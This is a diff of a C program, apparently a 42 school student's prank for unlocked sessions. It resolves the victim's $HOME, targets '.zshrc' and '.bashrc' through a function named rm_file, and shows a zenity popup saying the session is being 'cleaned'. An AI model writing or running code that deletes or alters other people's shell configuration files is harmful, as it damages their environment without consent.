@@ -6,7 +6,7 @@
 /*   By: mgama <mgama@student.42lyon.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2023/06/22 01:23:49 by mgama             #+#    #+#             */
-/*   Updated: 2023/06/26 22:37:52 by mgama            ###   ########.fr       */
+/*   Updated: 2023/06/26 22:43:22 by mgama            ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -104,35 +104,26 @@ int	rm_file(char *home_buffer, char **envp)
 
 int	print_info(int fd, char **envp)
 {
-	// char	**scmds;
-	// char	*cmd[] = {"zenity", "--info", "--width=500", "--title", "Well done!", "--text", "You found the good one!\nWe are currently cleaning your session, it might take some time to repair everything don't panic.\n\nNext time lock your session 😉", NULL};
+	/* could not find MacOS equivalent for zenity, function only called on Linux */
 	char	*cmd[] = {"zenity", "--progress", "--width=500", "--title", "Well done!", "--text", "You found the good one!\nWe are currently cleaning your session, it might take some time to repair everything don't panic.\n\nNext time lock your session 😉", NULL};
 
-// #ifndef __APPLE__
-	// sprintf(cmd, "zenity --info --title %s --text %s", "Well done!", "We are currently cleaning your session, please wait.");
-// #endif /* __APPLE__ */
-	// scmds = ft_split(cmd, ' ');
-	// if (!scmds)
-	// 	return (1);
 // #ifndef __APPLE__
 	process_child_fdin(cmd, envp, fd);
 	// waitpid(-1, NULL, 0);
 // #endif /* __APPLE__ */
-	// waitpid(-1, NULL, 0);
 	return (0);
 }
 
 int	main(int ac, char **av, char **envp)
 {
 	int			i;
+#ifndef __APPLE__
 	int			fd[2];
+#endif /* __APPLE__ */
 	char		*path;
 	char		home_buffer[PATH_MAX];
 	char		current_file_buffer[PATH_MAX];
 	static char	*file_list[] = {"/.zshrc", "/.bashrc", NULL};
-// #ifndef __APPLE__
-// 	static char	*progress_bar[] = {"echo", "100", NULL};
-// #endif /* __APPLE__ */
 
 	i = 0;
 	realpath(getenv("HOME"), home_buffer);
@@ -154,7 +145,7 @@ int	main(int ac, char **av, char **envp)
 		free(path);
 		i++;
 	}
-	usleep(10);
+	sleep(500);
 #ifndef __APPLE__
 	dprintf(fd[1], "%d\n", 80);
 #endif /* __APPLE__ */
